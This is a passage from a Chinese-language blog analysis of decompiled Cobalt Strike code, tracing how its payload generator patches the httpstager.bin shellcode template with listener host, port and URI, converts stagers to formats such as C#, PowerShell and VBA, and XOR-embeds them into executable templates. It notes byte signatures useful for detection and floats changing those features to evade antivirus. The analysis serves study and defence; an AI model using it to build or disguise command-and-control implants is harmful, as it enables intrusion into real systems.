class="line">    this.stager &#x3D; ListenerUtils.getListener(this.client, var4).getPayloadStager(var3 ? &quot;x64&quot; : &quot;x86&quot;); &#x2F;&#x2F;首先调用getListener获取到Listener，再调用getPayloadStager获取stager</span><br><span class="line">    if (this.stager.length &#x3D;&#x3D; 0) &#123; &#x2F;&#x2F;判断stager是否生成成功，如果为空，则报错</span><br><span class="line">        if (var3) &#123;</span><br><span class="line">            DialogUtils.showError(&quot;No x64 stager for listener &quot; + var4);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            DialogUtils.showError(&quot;No x86 stager for listener &quot; + var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Map var5 &#x3D; DialogUtils.toMap(&quot;ASPX: aspx, C: c, C#: cs, HTML Application: hta, Java: java, Perl: pl, PowerShell: ps1, PowerShell Command: txt, Python: py, Raw: bin, Ruby: rb, COM Scriptlet: sct, Veil: txt, VBA: vba&quot;);  &#x2F;&#x2F;将内容转换为Map形式</span><br><span class="line">        String var6 &#x3D; DialogUtils.string(var2, &quot;format&quot;); &#x2F;&#x2F;从var2这个hashmap中获取键为format对应的值</span><br><span class="line">        String var7 &#x3D; &quot;payload.&quot; + var5.get(var6); &#x2F;&#x2F;拼接内容大概是payload.format</span><br><span class="line">        SafeDialogs.saveFile((JFrame)null, var7, this); &#x2F;&#x2F;调用save方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​            我们将下面这句代码扩展分析一下，getListener故名思意就是获取Listener，跟进去后发现会返回一个SCListener对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.stager &#x3D; ListenerUtils.getListener(this.client, var4).getPayloadStager(var3 ? &quot;x64&quot; : &quot;x86&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831181115893.png" alt="image-20200831181115893"></p>
<p>​        我们主要关注一下getPayloadStager是如何运行的，跟进后发现getPayloadStager仅仅返回了Stagers.shellcode的执行结果</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831181157627.png" alt="image-20200831181157627"></p>
<p>​        跟进shellcode方法，执行了两个操作，首先调用resolve方法进行解析，返回一个GenericStager对象，再调用这个对象的generate方法。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831181808133.png" alt="image-20200831181808133"></p>
<p>​        跟进resolve看看执行了什么操作，在if中会判断var3是否是x86结构，如果是将this.x86_stagers赋值给var4,再判断var6是否包含var2关键字，如果包含，则调用create方法。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831191822995.png" alt="image-20200831191822995"></p>
<p>​        我们先看看x86_stagers是怎么来的，在Stagers类的开始创建了X86_stagers和x64_stagers，并且调用了Stagers（）这个构造方法，我们可以看到在这个方法中调用了add方法来执行操作</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831192312035.png" alt="image-20200831192312035"></p>
<p>​        再跟进去看看add方法执行了什么操作,首先通过掉用TestAech方法判断是否含有x86或x64,如果正常以后再判断是否是x86，如果是则向x86_stagers则以键值对的形式写入内容，如果不是则向x64_stagers写入内容。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831192737834.png" alt="image-20200831192737834"></p>
<p>​        我们选择一个BeaconHTTPStagerX86来看看，payload函数执行了什么操作，通过下面的代码可以看到返回了windows/beacon_http/reverse_http，其他的payload函数返回的内容类似，就不一一举例了。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831193156043.png" alt="image-20200831193156043"></p>
<p>​        那么var1的内容是什么呢？还是以http x86的stager为例，我们发现它是new BeaconHTTPStagerX86（）后返回的结果。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203310084.png" alt="image-20200831203310084"></p>
<p>​        那么BeaconHTTPStagerX86在构造方法中又做了什么操作呢，我们通过下面的代码可以看到它调用了父类GenericHTTPStagerX86的构造方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203430325.png" alt="image-20200831203430325"></p>
<p>​        跟进GenericHTTPStagerX86的构造方法，发现其又调用了父类GenericHTTPStager的构造方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203519702.png" alt="image-20200831203519702"></p>
<p>​        跟进GenericHTTPStager的构造方法，发现其又调用了父类GenericStager的构造方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203558124.png" alt="image-20200831203558124"></p>
<p>​        在GenericStager方法中，可以看到其实什么也没做</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203712286.png" alt="image-20200831203712286"></p>
<p>​        最后其实比较关键的代码是调用了generate方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831203932934.png" alt="image-20200831203932934"></p>
<p>​        因为我的listener是http x86的listener，所以最终调用stagers\GenericHTTPStager.class的generate方法如下，</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200831204215357.png" alt="image-20200831204215357"></p>
<p>​        在该代码种首先通过resouce方法加载资源，资源文件，资源文件是通过getStagetFile()获得的，在GenericHTTPStager.class中的getStagetFile是一个抽象方法，而且GenericHTTPStager也是一个抽象类，所以我们要在继承了GenericHTTPStager的子类中寻找getStagetFile的实现，最终在GenericHTTPStagerX86找到了getStagetFile的实现，是加载resources/httpstager.bin文件</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901094550546.png" alt="image-20200901094550546"></p>
<p>​        下面的代码中,读取httpstager.bin文件的内容，并且对其中的某些值进行替换，httpstager.bin其实就是shellcode生成的一个模板文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public byte[] generate() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           InputStream var1 &#x3D; CommonUtils.resource(this.getStagerFile());  &#x2F;&#x2F;读取httpstager.bin的内容</span><br><span class="line">           byte[] var2 &#x3D; CommonUtils.readAll(var1);</span><br><span class="line">           String var3 &#x3D; CommonUtils.bString(var2); &#x2F;&#x2F;从byte类型转换为字符串类型</span><br><span class="line">           var1.close();</span><br><span class="line">           var3 &#x3D; var3 + this.getListener().getStagerHost() + &#39;\u0000&#39;; &#x2F;&#x2F;从option中获取host</span><br><span class="line">           Packer var4 &#x3D; new Packer();  &#x2F;&#x2F;类中内置了对于字符串，字节，hex等处理的方法</span><br><span class="line">           var4.little(); &#x2F;&#x2F;字节顺序，决定大端字节和小端字节的读取问题</span><br><span class="line">           var4.addShort(this.getListener().getPort()); &#x2F;&#x2F;从option中获取port值</span><br><span class="line">           AssertUtils.TestPatchS(var2, 4444, this.getPortOffset()); &#x2F;&#x2F;判断getPortOffset的对应的值是否是4444</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getPortOffset()); &#x2F;&#x2F;将4444替换为option设置的端口地址</span><br><span class="line">           var4 &#x3D; new Packer();</span><br><span class="line">           var4.little();</span><br><span class="line">           var4.addInt(1453503984); &#x2F;&#x2F;exit对应的偏移地址</span><br><span class="line">           AssertUtils.TestPatchI(var2, 1453503984, this.getExitOffset());</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getExitOffset()); &#x2F;&#x2F;exit对应的偏移地址替换，不过这个看起来默认是没变的</span><br><span class="line">           var4 &#x3D; new Packer();</span><br><span class="line">           var4.little();</span><br><span class="line">           var4.addShort(this.getStagePreamble());&#x2F;&#x2F;在getStagePreamble中判断是否为forign类型，如果不是，则返回stage_offset。</span><br><span class="line">           AssertUtils.TestPatchS(var2, 5555, this.getSkipOffset()); &#x2F;&#x2F;判断getSkipOffset的返回值是否是5555</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getSkipOffset()); &#x2F;&#x2F;将stage_offset的值进行替换</span><br><span class="line">           var4 &#x3D; new Packer();</span><br><span class="line">           var4.little();</span><br><span class="line">           var4.addInt(this.getConnectionFlags());  &#x2F;&#x2F;判断是否是https</span><br><span class="line">           AssertUtils.TestPatchI(var2, this.isSSL() ? -2069876224 : -2074082816, this.getFlagsOffset());</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, CommonUtils.bString(var4.getBytes()), this.getFlagsOffset());</span><br><span class="line">           String var5;</span><br><span class="line">           if (CommonUtils.isin(CommonUtils.repeat(&quot;X&quot;, 303), var3)) &#123;</span><br><span class="line">               var5 &#x3D; this.getConfig().pad(this.getHeaders() + &#39;\u0000&#39;, 303);</span><br><span class="line">               var3 &#x3D; CommonUtils.replaceAt(var3, var5, var3.indexOf(CommonUtils.repeat(&quot;X&quot;, 127))); &#x2F;&#x2F;将hreader中的值进行替换</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           int var6 &#x3D; var3.indexOf(CommonUtils.repeat(&quot;Y&quot;, 79), 0);</span><br><span class="line">           var5 &#x3D; this.getConfig().pad(this.getURI() + &#39;\u0000&#39;, 79);</span><br><span class="line">           var3 &#x3D; CommonUtils.replaceAt(var3, var5, var6); &#x2F;&#x2F;从config中获取url的值，并进行替换</span><br><span class="line">           return CommonUtils.toBytes(var3 + this.getConfig().getWatermark()); &#x2F;&#x2F;以字节数组的形式返回</span><br><span class="line">       &#125; catch (IOException var7) &#123;</span><br><span class="line">           MudgeSanity.logException(&quot;HttpStagerGeneric: &quot; + this.getStagerFile(), var7, false);</span><br><span class="line">           return new byte[0];</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>​        通过上面的分析，我们可以看出来，这里所作的操作就是读取httpstager.bin这个模板文件，然后对模板文件中的请求地址，请求头等地方进行替换。</p>
<p>​        再回到aggressor\dialogs\PayloadGeneratorDialog.class中，我们看下dialogResult方法,这个方法会针对我们选择不同的shellcode的生成类型，将stager转换为不同的类型，最后写入到文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public void dialogResult(String var1) &#123;</span><br><span class="line">      String var2 &#x3D; DialogUtils.string(this.options, &quot;format&quot;);</span><br><span class="line">      boolean var3 &#x3D; DialogUtils.bool(this.options, &quot;x64&quot;);</span><br><span class="line">      String var4 &#x3D; DialogUtils.string(this.options, &quot;listener&quot;);</span><br><span class="line">      if (var2.equals(&quot;C&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toC(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;C#&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toCSharp(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;Java&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toJava(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;Perl&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toPerl(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell&quot;) &amp;&amp; var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new ResourceUtils(this.client)).buildPowerShell(this.stager, true);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell&quot;) &amp;&amp; !var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new ResourceUtils(this.client)).buildPowerShell(this.stager);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell Command&quot;) &amp;&amp; var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new PowerShellUtils(this.client)).buildPowerShellCommand(this.stager, true);</span><br><span class="line">      &#125; else if (var2.equals(&quot;PowerShell Command&quot;) &amp;&amp; !var3) &#123;</span><br><span class="line">          this.stager &#x3D; (new PowerShellUtils(this.client)).buildPowerShellCommand(this.stager, false);</span><br><span class="line">      &#125; else if (var2.equals(&quot;Python&quot;)) &#123;</span><br><span class="line">          this.stager &#x3D; Transforms.toPython(this.stager);</span><br><span class="line">      &#125; else if (!var2.equals(&quot;Raw&quot;)) &#123;</span><br><span class="line">          if (var2.equals(&quot;Ruby&quot;)) &#123;</span><br><span class="line">              this.stager &#x3D; Transforms.toPython(this.stager);</span><br><span class="line">          &#125; else if (var2.equals(&quot;COM Scriptlet&quot;)) &#123;</span><br><span class="line">              if (var3) &#123;</span><br><span class="line">                  DialogUtils.showError(var2 + &quot; is not compatible with x64 stagers&quot;);</span><br><span class="line">                  return;</span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">              this.stager &#x3D; (new ArtifactUtils(this.client)).buildSCT(this.stager);</span><br><span class="line">          &#125; else if (var2.equals(&quot;Veil&quot;)) &#123;</span><br><span class="line">              this.stager &#x3D; Transforms.toVeil(this.stager);</span><br><span class="line">          &#125; else if (var2.equals(&quot;VBA&quot;)) &#123;</span><br><span class="line">              this.stager &#x3D; CommonUtils.toBytes(&quot;myArray &#x3D; &quot; + Transforms.toVBA(this.stager));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      CommonUtils.writeToFile(new File(var1), this.stager);</span><br><span class="line">      DialogUtils.showInfo(&quot;Saved &quot; + var2 + &quot; to\n&quot; + var1);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>​        我们以C#为例来进行分析，主要代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (var2.equals(&quot;C#&quot;)) &#123;</span><br><span class="line">            this.stager &#x3D; Transforms.toCSharp(this.stager);</span><br></pre></td></tr></table></figure>

<p>​        跟进toCSharp方法，创建了一个Packer对象，添加了stager长度的字符串，再添加了stager字节数组的字符串。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901115643729.png" alt="image-20200901115643729"></p>
<p>​        最后再将生成的shellcode写入文件。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901115942287.png" alt="image-20200901115942287"></p>
<p>​        好了，关于payload generator的过程就分析到这里，可能由于个人水平有限，在静态代码分析的功底有限，有些地方可能分析的不对，不过这里大致的流程分析是没有问题的。主要是在stager生成这里，将httpstager.bin模板里的关于监听主机和端口以及uri的位置进行了替换和修改，然后根据不同的类型写入文件。所以如果要免杀，其实有一个思路也是可以将这个httpstager.bin的内容分析出来，将有特征的部分进行更改。</p>
<h3 id="windows-executable"><a href="#windows-executable" class="headerlink" title="windows executable"></a>windows executable</h3><p>​        windows executable是在WindowsExecutableDialog.class中进行处理的，其中关于stager生成的部分和payload generator相同，就不分析了，再看下dialogResult方法，先看下windows exe是怎么处理的，这里主要是调用了patchArtifact方法来进行处理，我们看下这个方法是做什么的。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901133939693.png" alt="image-20200901133939693"></p>
<p>​        跟进patchArtifact，发现内部还调用了patchArtifact方法</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901134326360.png" alt="image-20200901134326360"></p>
<p>​        继续跟进</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public byte[] patchArtifact(byte[] var1, String var2) &#123;</span><br><span class="line">    Stack var3 &#x3D; new Stack();</span><br><span class="line">    var3.push(SleepUtils.getScalar(var1));</span><br><span class="line">    var3.push(SleepUtils.getScalar(var2));</span><br><span class="line">    String var4 &#x3D; this.client.getScriptEngine().format(&quot;EXECUTABLE_ARTIFACT_GENERATOR&quot;, var3);</span><br><span class="line">    return var4 &#x3D;&#x3D; null ? this.fixChecksum(this._patchArtifact(var1, var2)) : this.fixChecksum(CommonUtils.toBytes(var4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        主要看下_patchArtifact的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public byte[] _patchArtifact(byte[] var1, String var2) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        InputStream var3 &#x3D; CommonUtils.resource(&quot;resources&#x2F;&quot; + var2); &#x2F;&#x2F;我这里var2是artifact64.exe，所以这里加载的是resources&#x2F;artifact64.exe</span><br><span class="line">        byte[] var4 &#x3D; CommonUtils.readAll(var3); &#x2F;&#x2F;读取artifact64.exe的内容</span><br><span class="line">        var3.close();</span><br><span class="line">        byte[] var5 &#x3D; new byte[]&#123;(byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254), (byte)CommonUtils.rand(254)&#125;;</span><br><span class="line">        byte[] var6 &#x3D; new byte[var1.length];</span><br><span class="line"></span><br><span class="line">        for(int var7 &#x3D; 0; var7 &lt; var1.length; ++var7) &#123;</span><br><span class="line">            var6[var7] &#x3D; (byte)(var1[var7] ^ var5[var7 % 4]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String var12 &#x3D; CommonUtils.bString(var4);</span><br><span class="line">        int var8 &#x3D; var12.indexOf(CommonUtils.repeat(&quot;A&quot;, 1024));&#x2F;&#x2F;找到存在1024个A的位置</span><br><span class="line">        Packer var9 &#x3D; new Packer();</span><br><span class="line">        var9.little();</span><br><span class="line">        var9.addInteger(var8 + 16);</span><br><span class="line">        var9.addInteger(var1.length); &#x2F;&#x2F;写入stager的长度</span><br><span class="line">        var9.addString(var5, var5.length); &#x2F;&#x2F; 写入随机字符</span><br><span class="line">        var9.addString(&quot;aaaa&quot;, 4);  </span><br><span class="line">        var9.addString(var6, var6.length); &#x2F;&#x2F;写入stager内容</span><br><span class="line">        if (License.isTrial()) &#123;</span><br><span class="line">            var9.addString(&quot;X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;);</span><br><span class="line">            CommonUtils.print_trial(&quot;Added EICAR string to &quot; + var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        byte[] var10 &#x3D; var9.getBytes();</span><br><span class="line">        var12 &#x3D; CommonUtils.replaceAt(var12, CommonUtils.bString(var10), var8);</span><br><span class="line">        return CommonUtils.toBytes(var12);</span><br><span class="line">    &#125; catch (IOException var11) &#123;</span><br><span class="line">        MudgeSanity.logException(&quot;patchArtifact&quot;, var11, false);</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        总结一下上面的过程，主要就是将1024个A的地址进行替换，替换为随机字符和stager。        </p>
<p>​        用010 editor打开artifact64.exe文件，发现确实是有很多A</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901140702963.png" alt="image-20200901140702963"></p>
<p>​        我们再尝试生成一个x64的exe，用010 editor再看看里面的内容，我们可以看到在某处的开头是有aaaa，并且在最后还有一些大写的A,所以这两个点都可以当作CobaltStrike默认生成的exe的特征。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901142122258.png" alt="image-20200901142122258"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901142214196.png" alt="image-20200901142214196"></p>
<p>​        我再看了下dll和service类型的生成方式，发现最终都调用了_patchArtifact方法，因此他们这些模板文件中也都包含了1024个A，并且在替换的过程中首先也会写入四个a,我们以dll为例再看看。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901143237412.png" alt="image-20200901143237412"></p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901143245238.png" alt="image-20200901143245238"></p>
<p>​        那我们猜想一下，关于这个特征查杀是也可以根据首先出现4个a，在1024个字符以内，又同时出现10个A来进行检测呢？</p>
<h3 id="windows-executables"><a href="#windows-executables" class="headerlink" title="windows executables"></a>windows executables</h3><p>​        还有一种形式，我们在使用privote生成shellcode常用到，那就是windows executables生成的是stagerless类型，这种形式的生成是在WindowsExecutableStageDialog.class文件中</p>
<p>​        首先看下dialogAction中的代码，我们可以看到和payload generator和windows executable的形式不同，executables中并没有在这个方法中生成stager。</p>
<p><img src="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/image-20200901144358493.png" alt="image-20200901144358493"></p>
<p>​        再看下dialogResult方法,和其他的方式不同，它也获取了SCListener，并通过调用export方法</p>
